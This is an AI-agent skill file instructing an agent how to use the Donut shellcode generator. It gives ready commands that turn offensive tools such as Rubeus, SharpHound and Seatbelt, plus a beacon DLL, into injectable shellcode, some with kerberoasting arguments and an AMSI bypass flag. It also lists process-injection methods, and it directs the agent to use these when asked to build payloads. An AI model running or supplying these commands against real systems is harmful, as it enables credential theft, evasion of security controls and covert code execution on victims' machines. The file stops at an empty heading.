---
name: donut
description: "Shellcode generator that converts .NET assemblies, EXEs, DLLs, and COM objects into position-independent shellcode. Use when asked to convert a .NET tool into shellcode, load an assembly in memory, generate a payload for injection, or create position-independent shellcode from a Windows executable."
license: BSD-3-Clause
compatibility: "Linux, Windows. Install: git clone + make (Linux) or download prebuilt binary. Python bindings: pip install donut-shellcode."
metadata:
  author: AeonDave
  version: "1.0"
---

# Donut

Position-independent shellcode generator — converts .NET/Win32 native executables into injectable shellcode.

## Concept

Donut generates shellcode that:
1. Creates a CLR runtime in any process
2. Loads the target assembly/executable in memory
3. Executes it without touching disk

Output shellcode can be injected via any shellcode runner, process injection technique, or BOF.

## Quick Start

```bash
# Convert .NET assembly to shellcode
donut -f Rubeus.exe -o rubeus.bin

# With runtime arguments
donut -f Rubeus.exe -p "kerberoast /format:hashcat" -o rubeus_roast.bin

# Convert native DLL (call exported function)
donut -f beacon.dll -e "ReflectiveLoader" -o beacon.bin

# 64-bit only output
donut -f tool.exe -a 2 -o tool64.bin
```

## Core Flags

| Flag | Description |
|------|-------------|
| `-f <file>` | Input file (.exe, .dll, .NET assembly) |
| `-o <file>` | Output shellcode file |
| `-p <params>` | Command-line parameters for target |
| `-c <class>` | .NET class to instantiate |
| `-m <method>` | .NET method to invoke |
| `-n <ns>` | .NET namespace |
| `-a <arch>` | Architecture: `1`=x86, `2`=x64, `3`=both (default 3) |
| `-b <n>` | Bypass AMSI/WLDP: `1`=none, `2`=abort on fail, `3`=continue |
| `-t` | Run assembly in new thread |
| `-z <n>` | Compression: `1`=none, `2`=aPLib, `3`=LZNT1, `4`=Xpress, `5`=XpressHuff |
| `-e <n>` | Instance type: `1`=embedded (default), `2`=HTTP server |
| `-s <url>` | HTTP server URL (for `-e 2`) |

## Python API

```python
import donut

sc = donut.create(file="Rubeus.exe", params="dump /nowrap")
with open("rubeus.bin", "wb") as f:
    f.write(sc)
```

## Common Workflows

```bash
# Rubeus to shellcode for process injection
donut -f Rubeus.exe -p "asreproast /format:hashcat" -b 3 -o rubeus.bin

# SharpHound for BloodHound collection
donut -f SharpHound.exe -p "-c All" -o sharphound.bin

# Inject via process hollowing or CreateRemoteThread
# (use any shellcode runner/injector)

# Seatbelt for host enumeration
donut -f Seatbelt.exe -p "-group=all" -o seatbelt.bin

# x64 only with AMSI bypass
donut -f tool.exe -a 2 -b 3 -o tool.bin

# Load via powershell (reflective approach)
# Convert bin to base64, load with any injector
```

## Output Formats

Donut outputs raw shellcode by default. Feed it to:
- `CreateRemoteThread` injection
- `VirtualAlloc` + `CallWindowProc`
- BOF shellcode execution modules
- CS `execute-assembly` (direct .NET load, but donut extends this to native EXEs)

## Resources

| File | When to load |
|------|--------------|
| `references/injection-methods.md` | Shellcode injection techniques, process injection, AMSI bypass chain |

## Structuring This Skill
